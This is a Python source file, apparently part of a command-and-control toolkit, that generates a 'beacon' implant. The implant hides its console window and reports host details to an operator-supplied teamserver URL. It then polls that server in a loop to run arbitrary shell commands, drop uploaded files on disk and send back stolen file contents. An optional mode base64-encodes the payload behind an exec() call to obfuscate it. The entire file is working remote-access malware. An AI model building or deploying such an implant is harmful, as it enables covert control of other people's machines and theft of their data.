import os
import argparse
import base64
from textwrap import dedent

DEFAULT_OUTPUT_PATH = "build/beacon/beacon.py"

BEACON_CODE = '''
import urllib.request
import urllib.parse
import time
import subprocess
import uuid
import json
import platform
import socket
import base64
import os
import sys
import ctypes

TEAMSERVER_URL = "{server_url}"
SLEEP_INTERVAL = {interval}
STAGER_KEY = "{key}"

BEACON_ID = str(uuid.uuid4())
current_working_directory = os.getcwd()

def hide_console():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

def get_lan_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except:
        return "127.0.0.1"

def get_system_info():
    return {{
        "id": BEACON_ID,
        "hostname": socket.gethostname(),
        "os": platform.system(),
        "arch": platform.machine(),
        "ip": get_lan_ip(),
        "key": STAGER_KEY
    }}

def register():
    try:
        info = get_system_info()
        data = json.dumps(info).encode()
        req = urllib.request.Request(f"{{TEAMSERVER_URL}}/register", data=data, headers={{"Content-Type": "application/json"}})
        urllib.request.urlopen(req)
    except:
        pass

def check_in():
    try:
        params = {{
            "id": BEACON_ID,
            "key": STAGER_KEY
        }}
        query = urllib.parse.urlencode(params)
        url = f"{{TEAMSERVER_URL}}/task?{{query}}"
        try:
            response = urllib.request.urlopen(url)
            status = response.getcode()
            body = response.read().decode()
        except urllib.error.HTTPError as e:
            status = e.code
            body = ""

        if status == 404:
            register()
        elif status == 200 and body.strip():
            task = json.loads(body)
            result = execute_task(task)
            post_result(task.get("task_id", "unknown"), result)
    except:
        pass

def execute_task(task):
    global current_working_directory
    task_type = task.get("type")
    command = task.get("command", "")

    if task_type == "cmd":
        if command.startswith("cd"):
            path = command[3:].strip().strip('"').strip("'")
            if not path:
                return current_working_directory
            try:
                new_path = os.path.abspath(os.path.join(current_working_directory, path))
                if os.path.isdir(new_path):
                    current_working_directory = new_path
                    return f"[+] Changed directory to {{current_working_directory}}"
                else:
                    return f"[-] Not a directory: {{new_path}}"
            except Exception as e:
                return f"[-] Failed to change directory: {{e}}"
        try:
            output = subprocess.check_output(
                command, shell=True, stderr=subprocess.STDOUT,
                cwd=current_working_directory
            )
            return output.decode(errors="ignore")
        except subprocess.CalledProcessError as e:
            return e.output.decode(errors="ignore")

    elif task_type == "upload":
        try:
            dst = task.get("dst")
            full_dst = os.path.abspath(os.path.join(current_working_directory, dst))
            data = base64.b64decode(task.get("data", ""))
            with open(full_dst, "wb") as f:
                f.write(data)
            return f"[+] File uploaded to {{full_dst}}"
        except Exception as e:
            return f"[-] Upload failed: {{e}}"

    elif task_type == "download":
        try:
            filepath = task.get("path")
            full_path = os.path.abspath(os.path.join(current_working_directory, filepath))
            with open(full_path, "rb") as f:
                data = f.read()
            return base64.b64encode(data).decode()
        except Exception as e:
            return f"[-] Download failed: {{e}}"

    else:
        return "[-] Unknown task type"

def post_result(task_id, result):
    try:
        data = {{
            "id": BEACON_ID,
            "task_id": task_id,
            "result": result,
            "key": STAGER_KEY
        }}
        data = json.dumps(data).encode()
        req = urllib.request.Request(f"{{TEAMSERVER_URL}}/result", data=data, headers={{"Content-Type": "application/json"}})
        urllib.request.urlopen(req)
    except:
        pass

def main():
    hide_console()
    register()
    while True:
        check_in()
        time.sleep(SLEEP_INTERVAL)

if __name__ == "__main__":
    main()
'''


def generate_python_beacon(server_url, interval, output_file, key):
    os.makedirs(os.path.dirname(output_file), exist_ok=True)
    beacon_code = dedent(BEACON_CODE.format(server_url=server_url, interval=interval, key=key))
    with open(output_file, "w") as f:
        f.write(beacon_code.strip())
    print(f"[+] Beacon generated and saved to {output_file}")

def generate_encoded_beacon(server_url, interval, output_file, key):
    os.makedirs(os.path.dirname(output_file), exist_ok=True)
    beacon_code = dedent(BEACON_CODE.format(server_url=server_url, interval=interval, key=key))
    encoded = base64.b64encode(beacon_code.encode()).decode()
    wrapped = f"import base64\nexec(base64.b64decode('{encoded}'))"
    with open(output_file, "w") as f:
        f.write(wrapped.strip())
    print(f"[+] Obfuscated beacon saved to {output_file}")

def main():
    parser = argparse.ArgumentParser(description="Beacon Generator")
    parser.add_argument("server", help="C2 server URL (e.g., http://127.0.0.1:5000)")
    parser.add_argument("--interval", type=int, default=3, help="Beacon interval in seconds")
    parser.add_argument("--key", default="SuperSecretKey123!", help="Stager key to authenticate beacon")
    parser.add_argument("-o", "--output", default=DEFAULT_OUTPUT_PATH, help="Output file name")
    parser.add_argument("--obfuscate", action="store_true", help="Base64 encode the payload")

    args = parser.parse_args()

    if args.obfuscate:
        generate_encoded_beacon(args.server, args.interval, args.output, args.key)
    else:
        generate_python_beacon(args.server, args.interval, args.output, args.key)

if __name__ == "__main__":
    main()

